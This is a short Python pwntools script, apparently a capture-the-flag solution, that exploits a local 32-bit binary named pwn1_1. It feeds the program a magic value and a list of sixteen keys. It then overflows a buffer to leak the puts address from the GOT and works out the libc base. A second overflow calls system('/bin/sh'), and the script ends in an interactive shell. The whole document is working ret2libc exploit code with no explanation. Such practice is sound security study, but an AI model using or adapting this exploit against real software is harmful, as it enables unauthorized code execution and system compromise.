from pwn import *
import sys
r=process('./pwn1_1')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
r.recvuntil(">")
payload="666"
r.sendline(payload)
key=["7803130","9439332","1","9343165","6338414","4966784","1","2183718","9457591","7983247","1","3624377","8300952","6187926","1","777134"]
for i in range(16):
  r.sendlineafter(":",str(key[i]))

r.sendlineafter(': ','A'*16+p32(0x8048450)+p32(0x08048703)+p32(0x0804d01c)) #puts.plt+win+puts.got
puts = u32(r.recvn(4)) #32 bit oldugu icin 4 byte okudum
log.info('puts = %x' % puts)
libc.address = puts - libc.symbols["puts"]
r.sendlineafter(': ','A'*16 + p32(libc.symbols["system"]) +p32(0)+ p32(next(libc.search('/bin/sh'))))



r.interactive()
